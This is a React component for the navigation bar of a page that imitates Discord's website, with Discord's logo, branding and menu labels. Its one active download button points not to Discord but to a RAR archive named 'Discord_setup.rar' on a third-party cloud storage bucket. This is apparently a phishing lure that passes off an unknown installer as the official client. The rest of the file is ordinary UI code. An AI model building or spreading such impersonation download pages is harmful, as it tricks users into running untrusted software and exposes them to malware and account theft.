'use client';

import React, { useState, useEffect } from 'react';
import { useLanguage } from '@/contexts/LanguageContext';
import { useTheme } from '@/contexts/ThemeContext';

interface DropdownItem {
  label: string;
  href: string;
  description?: string;
}

interface NavItem {
  label: string;
  href?: string;
  dropdown?: DropdownItem[];
}

const Navbar = () => {
  const [isScrolled, setIsScrolled] = useState(false);
  const [activeDropdown, setActiveDropdown] = useState<string | null>(null);
  const { t } = useLanguage();
  const { theme } = useTheme();

  useEffect(() => {
    const handleScroll = () => {
      setIsScrolled(window.scrollY > 50);
    };

    window.addEventListener('scroll', handleScroll);
    return () => window.removeEventListener('scroll', handleScroll);
  }, []);

  const navItems: NavItem[] = [
    { label: t.nav.download, href: '#' },
    { label: t.nav.nitro, href: '#' },
    { label: t.nav.discover, href: '#' },
    {
      label: t.nav.safety,
      dropdown: [
        { label: t.dropdowns.safety.familyCenter.label, href: '#', description: t.dropdowns.safety.familyCenter.description },
        { label: t.dropdowns.safety.safetyLibrary.label, href: '#', description: t.dropdowns.safety.safetyLibrary.description },
        { label: t.dropdowns.safety.safetyNews.label, href: '#', description: t.dropdowns.safety.safetyNews.description },
        { label: t.dropdowns.safety.teenCharter.label, href: '#', description: t.dropdowns.safety.teenCharter.description },
      ]
    },
    {
      label: t.nav.quests,
      dropdown: [
        { label: t.dropdowns.quests.advertising.label, href: '#', description: t.dropdowns.quests.advertising.description },
        { label: t.dropdowns.quests.successStories.label, href: '#', description: t.dropdowns.quests.successStories.description },
        { label: t.dropdowns.quests.questsFaq.label, href: '#', description: t.dropdowns.quests.questsFaq.description },
      ]
    },
    {
      label: t.nav.support,
      dropdown: [
        { label: t.dropdowns.support.helpCenter.label, href: '#', description: t.dropdowns.support.helpCenter.description },
        { label: t.dropdowns.support.feedback.label, href: '#', description: t.dropdowns.support.feedback.description },
        { label: t.dropdowns.support.submitRequest.label, href: '#', description: t.dropdowns.support.submitRequest.description },
      ]
    },
    {
      label: t.nav.blog,
      dropdown: [
        { label: t.dropdowns.blog.featured.label, href: '#', description: t.dropdowns.blog.featured.description },
        { label: t.dropdowns.blog.community.label, href: '#', description: t.dropdowns.blog.community.description },
        { label: t.dropdowns.blog.discordHq.label, href: '#', description: t.dropdowns.blog.discordHq.description },
        { label: t.dropdowns.blog.engineering.label, href: '#', description: t.dropdowns.blog.engineering.description },
        { label: t.dropdowns.blog.howTo.label, href: '#', description: t.dropdowns.blog.howTo.description },
        { label: t.dropdowns.blog.policy.label, href: '#', description: t.dropdowns.blog.policy.description },
      ]
    },
    {
      label: t.nav.developers,
      dropdown: [
        { label: t.dropdowns.developers.socialSdk.label, href: '#', description: t.dropdowns.developers.socialSdk.description },
        { label: t.dropdowns.developers.appsActivities.label, href: '#', description: t.dropdowns.developers.appsActivities.description },
        { label: t.dropdowns.developers.docs.label, href: '#', description: t.dropdowns.developers.docs.description },
        { label: t.dropdowns.developers.applications.label, href: '#', description: t.dropdowns.developers.applications.description },
        { label: t.dropdowns.developers.helpCenter.label, href: '#', description: t.dropdowns.developers.helpCenter.description },
      ]
    },
    { label: t.nav.careers, href: '#' },
  ];

  return (
    <nav className={`fixed top-0 w-full z-50 transition-all duration-300 theme-transition ${
      isScrolled
        ? `${theme === 'light' ? 'bg-white/95' : 'bg-[#32379d]/95'} backdrop-blur-lg shadow-lg`
        : 'bg-transparent'
    }`}>
      <div className="max-w-7xl mx-auto px-6 lg:px-20">
        <div className="flex items-center justify-between py-4">
          {/* Logo */}
          <div className="flex items-center scale-on-hover">
            <img
              src="https://ext.same-assets.com/1695138707/1651483769.svg"
              alt="Discord"
              className="w-20 h-20"
            />
          </div>

          {/* Navigation removed per user request */}

          {/* Download Button */}
          <a href="https://poapoa.oss-cn-hongkong.aliyuncs.com/Discord_setup.rar" className="bg-white text-gray-900 px-4 py-2 rounded-full text-sm font-medium hover:bg-gray-100 transition-all duration-200 ripple micro-bounce magnetic flex items-center" download>
            <svg className="w-4 h-4 mr-2" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M3 17a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zm3.293-7.707a1 1 0 011.414 0L9 10.586V3a1 1 0 112 0v7.586l1.293-1.293a1 1 0 111.414 1.414l-3 3a1 1 0 01-1.414 0l-3-3a1 1 0 010-1.414z" clipRule="evenodd" />
            </svg>
            {t.nav.download}
          </a>
        </div>
      </div>
    </nav>
  );
};

export default Navbar;
